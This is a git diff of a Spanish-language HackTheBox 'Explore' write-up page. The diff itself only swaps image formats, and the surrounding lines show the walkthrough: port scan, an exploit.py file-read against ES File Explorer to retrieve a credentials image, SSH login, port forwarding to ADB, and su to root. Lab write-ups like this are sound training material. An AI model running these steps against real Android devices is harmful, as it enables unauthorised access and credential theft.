@@ -23,7 +23,7 @@
         <h1>Red Team & Ctf Pl4yer</h1>
         <h2>HackTheBox - Explore</h2>
             <p class="autor">Autor:&nbsp;<code class="code_autor_htb">bertolis</code></p>
-            <img src="../assets/img/htb_explore/ExploreSmall.png" alt="explore">
+            <img class="img_htb" src="../assets/img/htb_explore/ExploreSmall.webp" alt="explore">
             <h3>Escaneo de puertos</h3>
             <pre class="pre">
 <code class="code language-txt">❯ nmap -p- --open -T5 -v -n 10.10.10.247
@@ -110,18 +110,18 @@ ftpRoot : /sdcard
 ftpPort : 3721</code></pre>
             <p>Con<code class="code_negrita">&nbsp;listPics&nbsp;</code>veo un nombre y una ruta que me llama la atención.</p>
             <pre class="pre"><code class="language-txt">❯ python3 exploit.py listPics 10.10.10.247</code></pre>
-            <img src="../assets/img/htb_explore/listPics.png" alt="listPics">
+            <img src="../assets/img/htb_explore/listPics.webp" alt="listPics">
 
             <p>Con<code class="code_negrita">&nbsp;getFile&nbsp;</code>descargo la imagen.</p>
             <pre class="pre"><code class="language-txt">❯ python3 exploit.py getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg</code></pre>
-            <img src="../assets/img/htb_explore/getFile.png" alt="getFile">
+            <img src="../assets/img/htb_explore/getFile.webp" alt="getFile">
             <p>Abro la imagen y veo unas credenciales de acceso.</p>
-            <img src="../assets/img/htb_explore/kristi.png" alt="kristi">
+            <img src="../assets/img/htb_explore/kristi.webp" alt="kristi">
             <p>Una vez dentro del sistema me muevo a <code class="code_negrita"> &nbsp;/sdcard&nbsp;</code> para leer la flag de user.</p>
             <pre class="pre"><code class="language-txt">:/sdcard $ cat user.txt                                                        
 fxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx0</code></pre>
             <p>Lanzo un<code class="code_negrita">&nbsp;ss -ltun&nbsp;</code>y veo el puerto <code class="code_negrita">&nbsp;5555&nbsp;</code>abierto.</p>
-            <img src="../assets/img/htb_explore/ltun.png" alt="ltun">
+            <img src="../assets/img/htb_explore/ltun.webp" alt="ltun">
             <p>Como veo que el puerto abierto está en local usaré un ssh port forwarding para reenviar el puerto 5555 a mi máquina.</p>
             <pre class="pre"><code class="language-txt">ssh kristi@10.10.10.247 -p 2222 -L 5555:127.0.0.1:5555</code></pre>
             <h3>ADB</h3>
@@ -135,7 +135,7 @@ connected to localhost:5555</code></pre>
             <pre class="pre"><code class="language-txt">❯ adb -s localhost:5555 shell
 x86_64:/ $</code></pre>
 <h3>r00t</h3>
-            <p>Para elevar de privilegios escribo<code class="code_negrita">&nbsp;su</code>.<p>
+            <p>Para elevar de privilegios escribimos<code class="code_negrita">&nbsp;su</code>.<p>
             <pre class="pre"><code class="language-txt">x86_64:/ $ su
 :/ # </code></pre>
             <p>Con find busco el archivo root.txt para conseguir la flag de root.</p><pre class="pre"><code class="language-txt">:/ # find / -name "root.txt" 2>/dev null
